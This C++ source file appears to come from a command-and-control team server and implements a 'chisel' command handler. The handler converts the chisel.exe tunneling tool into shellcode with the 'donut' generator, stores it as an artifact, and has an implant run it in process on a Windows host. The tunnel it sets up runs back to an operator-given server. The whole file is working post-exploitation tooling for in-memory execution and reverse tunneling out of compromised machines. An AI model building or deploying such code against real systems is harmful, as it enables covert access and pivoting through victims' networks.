#include "TeamServerChiselCommandPreparer.hpp"

#include <algorithm>
#include <cctype>
#include <filesystem>
#include <sstream>
#include <utility>

#include "modules/ModuleCmd/Common.hpp"

namespace fs = std::filesystem;

namespace
{
std::string toLower(std::string value)
{
    std::transform(value.begin(), value.end(), value.begin(), [](unsigned char c)
    {
        return static_cast<char>(std::tolower(c));
    });
    return value;
}

std::vector<std::string> regroup(const std::vector<std::string>& tokens)
{
    return regroupStrings(tokens);
}

std::string joinTail(const std::vector<std::string>& tokens, std::size_t start)
{
    std::ostringstream output;
    for (std::size_t index = start; index < tokens.size(); ++index)
    {
        if (index != start)
            output << ' ';
        output << tokens[index];
    }
    return output.str();
}

ModuleCmd* findModule(std::vector<std::unique_ptr<ModuleCmd>>& modules, const std::string& name)
{
    const std::string loweredName = toLower(name);
    for (const auto& module : modules)
    {
        if (module && toLower(module->getName()) == loweredName)
            return module.get();
    }
    return nullptr;
}

TeamServerCommandPreparerResult handledError(C2Message& c2Message, const std::string& message)
{
    TeamServerCommandPreparerResult result;
    result.handled = true;
    result.status = -1;
    c2Message.set_returnvalue(message);
    return result;
}
} // namespace

TeamServerChiselCommandPreparer::TeamServerChiselCommandPreparer(
    std::shared_ptr<spdlog::logger> logger,
    TeamServerRuntimeConfig runtimeConfig,
    std::shared_ptr<TeamServerShellcodeService> shellcodeService,
    std::shared_ptr<TeamServerGeneratedArtifactStore> artifactStore,
    std::vector<std::unique_ptr<ModuleCmd>>& moduleCmd)
    : m_logger(std::move(logger)),
      m_runtimeConfig(std::move(runtimeConfig)),
      m_shellcodeService(std::move(shellcodeService)),
      m_artifactStore(std::move(artifactStore)),
      m_moduleCmd(moduleCmd)
{
}

bool TeamServerChiselCommandPreparer::canPrepare(const std::string& instruction) const
{
    return toLower(instruction) == "chisel";
}

TeamServerCommandPreparerResult TeamServerChiselCommandPreparer::prepare(
    const TeamServerCommandPreparerContext& context,
    C2Message& c2Message) const
{
    TeamServerCommandPreparerResult result;
    const std::vector<std::string> tokens = regroup(context.tokens);
    if (tokens.size() >= 2)
    {
        const std::string action = toLower(tokens[1]);
        if (action == "status" || action == "stop")
            return result;
    }

    result.handled = true;
    result.status = -1;
    if (!context.isWindows)
        return handledError(c2Message, "chisel is Windows-only.\n");
    if (tokens.size() < 4 || toLower(tokens[1]) != "client")
        return handledError(c2Message, "Usage: chisel client <server_host:port> <reverse_spec>\n");
    if (!m_shellcodeService || !m_artifactStore)
        return handledError(c2Message, "Shellcode preparation service is not available.\n");

    ModuleCmd* module = findModule(m_moduleCmd, "chisel");
    if (!module)
        return handledError(c2Message, "Module chisel not found.\n");

    const std::string arch = context.windowsArch.empty() ? m_runtimeConfig.defaultWindowsArch : context.windowsArch;
    const fs::path chiselPath = fs::path(m_runtimeConfig.toolsDirectoryPath) / "Windows" / arch / "chisel.exe";
    if (!fs::exists(chiselPath))
        return handledError(c2Message, "Required Chisel tool not found: " + chiselPath.string() + "\n");

    const std::string arguments = joinTail(tokens, 1);
    TeamServerShellcodeRequest shellcodeRequest;
    shellcodeRequest.generator = "donut";
    shellcodeRequest.sourcePath = chiselPath.string();
    shellcodeRequest.sourceType = "dotnet_exe";
    shellcodeRequest.arch = arch;
    shellcodeRequest.arguments = arguments;
    shellcodeRequest.exitPolicy = "process";

    TeamServerShellcodeResult shellcode = m_shellcodeService->generate(shellcodeRequest);
    if (!shellcode.ok)
        return handledError(c2Message, shellcode.message + "\n");

    TeamServerGeneratedArtifactRequest artifactRequest;
    artifactRequest.nameHint = "chisel-" + chiselPath.filename().string() + ".bin";
    artifactRequest.bytes = shellcode.bytes;
    artifactRequest.platform = "windows";
    artifactRequest.arch = arch;
    artifactRequest.source = shellcode.generator;
    artifactRequest.description = "Generated shellcode for chisel.";
    artifactRequest.tags = {"chisel", shellcode.sourceType};
    TeamServerGeneratedArtifactRecord artifact = m_artifactStore->store(artifactRequest);
    if (artifact.path.empty())
        return handledError(c2Message, "Could not store generated shellcode artifact.\n");

    ModulePreparedShellcodeTask task;
    task.inputFile = artifact.path;
    task.payload = shellcode.bytes;
    task.executionMode = "process";
    task.displayCommand = arguments;
    result.status = module->initPreparedShellcode(task, c2Message);
    if (result.status == 0 && m_logger)
        m_logger->info("chisel prepared shellcode artifact {}", artifact.path);
    return result;
}
